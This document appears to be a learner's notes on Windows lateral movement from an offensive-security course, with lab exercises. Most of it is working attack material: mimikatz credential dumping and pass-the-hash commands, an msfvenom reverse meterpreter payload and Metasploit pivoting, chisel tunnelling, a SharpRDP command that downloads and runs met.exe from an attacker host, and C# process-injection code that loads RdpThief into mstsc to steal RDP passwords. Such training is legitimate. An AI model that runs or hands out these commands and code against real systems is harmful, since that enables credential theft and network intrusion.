# Windows lateral movement

Psexec, WMI, DCOM, PSRemoting are the normal pathways to use stolen credentials

We will look at RDP and PsExec techniques

# Remote Desktop Protocol

Multi channel network protocol devveloped by Microsoft and is used for comunication between terminal servers and their clients.

It is commonly used in many corporate environments for remote administration using windows native remote Desktop connection application

# lateral movement with rdp

using rdektop in kali machine we will run mstsc.exe
and connect to appsrv01

> how is this going to happen in real time?


### caution

Connecting to a workstation with Remote Desktop will disconnect any existing
session. 
> The /admin flag allows us to connect to the admin session, which does not disconnect the current user if we perform the login with the same user.

using mimikatz to get the cached credentials

`privilege::debug`
`!+`
`!processprotect /process:lsass.exe /remove`
`sekurlsa::logonpasswords`

RD with restricted admin mode which allows sysadmin  to network logging with  as that user

Since we used restricted admin mode, no credentials have been cached, which helps mitigate
credential theft.
Restricted admin mode is disabled by default but the setting can be controlled through the
DisableRestrictedAdmin registry entry at the following path

`HKLM:\System\CurrentControlSet\Control\Lsa`

We will assume that we are already in possession of the admin user NTLM hash and are logged in
to the Windows 10 client as the dave user. We can then run mimikatz from an administrative
console and use the pth command to launch a mstsc.exe process in the context of the admin
user:

`privilege::debug`
`sekurlsa::pth /user:admin /domain:corpl /ntlm:2892D26CDF84D7A70E2EB3B9F05C425E /run:"mstsc.exe /restrictedadmin"`

Even though we opened a session as admin, the dialog suggests we are
authenticating as dave. This error stems from passing the hash with Mimikatz

To demonstrate this, we will first disable the restricted admin mode on our appsrv01 target. We’ll
do this from the RDP session as the admin user we just created by executing the PowerShell
command in Listing 606.

```
Remove-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name
DisableRestrictedAdmin
```

With restricted admin mode disabled, we’ll verify that we indeed can no longer log in by first
logging out of the RDP session on appsrv01 and immediately relaunching it from Mimikatz.

![](account_restrictions.png)


At this point, we are able to fully demonstrate our lateral movement. To re-enable restricted
admin mode, we are going to first launch a local instance of PowerShell on the Windows 10
machine in the context of the admin user with Mimikatz.

```
sekurlsa::pth /user:admin /domain:corp1
/ntlm:2892D26CDF84D7A70E2EB3B9F05C425E /run:powershell
```

From this PowerShell prompt, we’ll use the Enter-PSSession cmdlet and supply the appsrv01
hostname as the -Computer argument. This will provide us with shell access to our target
machine.

```
Enter-PSSession -Computer appsrv01
New-ItemProperty -Path
"HKLM:\System\CurrentControlSet\Control\Lsa" -Name DisableRestrictedAdmin -Value 0
Exit

```

The restricted admin mode setting is updated instantly and we can once again use it to gain
access to the target.
It is worth noting that the xfreerdp RDP client,788 which is installed on a Kali system by default,
supports restricted remote admin connections as well.
We can demonstrate the previous example with the command shown in Listing 609. Keep in mind
that the target RDP port must be reachable from our Kali attacking machine.

```
xfreerdp /u:admin /pth:2892D26CDF84D7A70E2EB3B9F05C425E /v:192.168.120.6
/cert-ignore
```

### 13.1.1.1 Exercises
1. Log in to the Windows 10 client as the offsec domain user. Use Mimikatz to pass the hash
and create an mstsc process with restricted admin enabled in the context of the dave user.
2. Repeat the steps to disable restricted admin mode and then re-enable it as part of the attack
through PowerShell remoting.

# Reverse RDP Proxying with Metasploit

There would be NAT configuration in firewall. 
We can use the traffic from compromised machine to the attacker machine to get data.

step 1 : compromise a windows machine
step 2 : use kali multi/manage/autoroute. This will allow us to configure a reverse tunnel through meterpreter session

used commands - 

```
kali@kali:~$ sudo msfvenom -p windows/x64/meterpreter_reverse_https LHOST=10.10.6.10 LPORT=4444 -f exe -o /var/www/html/msfn.exe

```

```
use multi/handler
set windows/x64/meterpreter_reverse_https
set LHOST
set LPORT
exploit
```

and then on getting a shell and putting it on the background following commands were run

```
msf5 exploit(multi/handler) > use multi/manage/autoroute
msf5 post(multi/manage/autoroute) > set session 1
session => 1
msf5 post(multi/manage/autoroute) > exploit

[!] SESSION may not be compatible with this module.
[*] Running module against WINWORK
[*] Searching for subnets to autoroute.
[+] Route added to subnet 10.10.0.0/255.255.0.0 from host's routing table.
[*] Post module execution completed
msf5 post(multi/manage/autoroute) > use auxiliary/server/socks4a
msf5 auxiliary(server/socks4a) > set srvhost 127.0.0.1
srvhost => 127.0.0.1
msf5 auxiliary(server/socks4a) > exploit -j
[*] Auxiliary module running as background job 0.
msf5 auxiliary(server/socks4a) > 

```

then add `socks4 127.0.0.1 1080` to the etc/proxychains.conf

```
kali@kali:~$ proxychains rdesktop 10.10.6.111
ProxyChains-3.1 (http://proxychains.sf.net)
Autoselecting keyboard map 'en-us' from locale
|S-chain|-<>-127.0.0.1:1080-<>-143.110.254.137:9797-<><>-10.10.6.111:3389-<--timeout
Core(error): tcp_connect(), unable to connect to 10.10.6.111
```
this did not work

### 13.1.2.1 Exercise
1. Configure a reverse tunnel with Metasploit and get RDP access to the Windows 10 client
machine.

# Reverse RDP Proxying with Chisel

when using powershell empire or covenant we may need standalone applications

one of the tools is chisel - written in golang

https://github.com/jpillora/chisel

need golang

`sudo apt update && sudo apt install golang`

With the Linux version compiled, we’ll turn to the Windows version. We can cross-compile chisel
for other operating systems and architectures with the Golang compiler. We’ll first specify a 64-bit
Windows executable with the env environment variable796 command. We’ll then set GOOS and
GOARCH to “windows” and “amd64” respectively.

Next, we’ll run go build, specifying the output file name (-o) and linker arguments797 (-ldflags
“-s -w”798), which will strip debugging information from the resulting binary:

`env GOOS=windows GOARCH=amd64 go build -o chisel.exe -ldflags "-s -w"`

`./chisel server -p 8080 --socks5`

`sudo sed -i 's/#PasswordAuthentication yes PasswordAuthentication yes/g' /etc/ssh/sshd_config`

`sudo systemctl start ssh.service`

`ssh -N -D 0.0.0.0:1080 localhost`

`chisel.exe client 192.168.119.120:8080 socks`

`sudo proxychains rdesktop 192.168.120.10`

> We can also use chisel with the classic reverse SSH tunnel syntax by specifying the -reverse option instead of --socks5 on the server side

### 13.1.3.1 Exercise
1. Configure a reverse tunnel with chisel and get RDP access to the Windows 10 client
machine.

# RDP as a Console

Although RDP is most often associated with the mstsc GUI client, it can also be used as a
command-line tool. This technique reduces our overhead while still relying on the RDP protocol,
which will often blend in well with typical network traffic.
The RDP application (mstsc.exe) builds upon the terminal services library mstscax.dll

SharpRDP801,802 is a C# application that uses uses the non-scriptable interfaces exposed by
mstscax.dll to perform authentication in the same way as mstsc.exe.

https://github.com/0xthirteen/SharpRDP

```
SharpRDP.exe computername=appsrv01 command=notepad username=corp1\dave
password=lab
```

also we can use

```
sharprdp.exe computername=appsrv01 command="powershell (New-Object
System.Net.WebClient).DownloadFile('http://192.168.119.120/met.exe',
'C:\Windows\Tasks\met.exe'); C:\Windows\Tasks\met.exe" username=corp1\dave
password=lab

exploit
```

### 13.1.4.1 Exercise
1. Repeat the steps in this section to get a reverse Meterpreter shell through the use of
SharpRDP.

# stealing clear text credentials from RDP

> Keyloggers are often used to capture clear text credentials. However, it can be difficult to isolate passwords with a generic keylogger and lengthy sessions can result in very verbose output, which can be difficult to parse.

for example we can try and hook into application like winexec
API hooking. Instead of pausing execution,
we could overwrite the initial instructions of an API at the assembly level with code that transfers
execution to any custom code we want. The Microsoft-provided unmanaged Detours library806
makes this possible and would allow an attacker to leak information from any API

RDPTheif was used which s=uses detours to hook onto the APIS

https://github.com/0x09AL/RdpThief

load rdpthief.dll - not able to install because of the nuget package

```C#
using System;
using System.Diagnostics;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
namespace Inject
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int
        processId);
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint
        dwSize, uint flAllocationType, uint flProtect);
        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress,
        byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);
        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr
        lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
        [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true,
        SetLastError = true)]
        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
        [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
        public static extern IntPtr GetModuleHandle(string lpModuleName);
        static void Main(string[] args)
        {
            String dllName = "C:\\Tools\\RdpThief.dll";
            Process[] mstscProc = Process.GetProcessesByName("mstsc");
            int pid = mstscProc[0].Id;
            IntPtr hProcess = OpenProcess(0x001F0FFF, false, pid);
            IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);
            IntPtr outSize;
            Boolean res = WriteProcessMemory(hProcess, addr, Encoding.Default.GetBytes(dllName),
            dllName.Length, out outSize);
            IntPtr loadLib = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
            IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, loadLib, addr, 0,IntPtr.Zero);
        }
    }
}
```

more modifications - not tested

```C#
static void Main(string[] args)
{
String dllName = "C:\\Tools\\RdpThief.dll";
while(true)
{
Process[] mstscProc = Process.GetProcessesByName("mstsc");
if(mstscProc.Length > 0)
{
for(int i = 0; i < mstscProc.Length; i++)
{
int pid = mstscProc[i].Id;
IntPtr hProcess = OpenProcess(0x001F0FFF, false, pid);
IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);
IntPtr outSize;
Boolean res = WriteProcessMemory(hProcess, addr,
Encoding.Default.GetBytes(dllName), dllName.Length, out outSize);
IntPtr loadLib = GetProcAddress(GetModuleHandle("kernel32.dll"),
"LoadLibraryA");
IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, loadLib, addr,
0, IntPtr.Zero);
}
}
Thread.Sleep(1000);
}
}
```

### 13.1.5.1 Exercises
1. Repeat the attack in this section and obtain clear text credentials

# Fileless Lateral Movement

like PsExec and DCOM, require
that services and files are written on the target system. Other techniques, such as PSRemoting,
require ports to be open in the firewall that are not always permitted by default

# authentication and execution theory

psexec authenticates to SMB on the target host and accesses the DCE/RPC interface. PsExec will use this interace to access the service cotrol manager create new service and execute it. 

The binary tha is executed by the service is copied to the target host

we will wrrite an attack without writing it to disk

code must authenticate to the target host
and then we should execute the desired code

its easy to pass the hash as well using this

# implementing fileless later movement in C#

```
using System;
using System.Runtime.InteropServices;
namespace lat
{
 class Program
 {
 [DllImport("advapi32.dll", EntryPoint="OpenSCManagerW", ExactSpelling=true, 
CharSet=CharSet.Unicode, SetLastError=true)]
 public static extern IntPtr OpenSCManager(string machineName, string databaseName, 
uint dwAccess);
 static void Main(string[] args)
 {
 String target = "appsrv01";
 
 IntPtr SCMHandle = OpenSCManager(target, null, 0xF003F);
 } 
 }
}
```

### using System;
using System.Runtime.InteropServices;
namespace lat
{
 class Program
 {
 [DllImport("advapi32.dll", EntryPoint="OpenSCManagerW", ExactSpelling=true, 
CharSet=CharSet.Unicode, SetLastError=true)]
 public static extern IntPtr OpenSCManager(string machineName, string databaseName, 
uint dwAccess);
 static void Main(string[] args)
 {
 String target = "appsrv01";
 
 IntPtr SCMHandle = OpenSCManager(target, null, 0xF003F);
 } 
 }
}














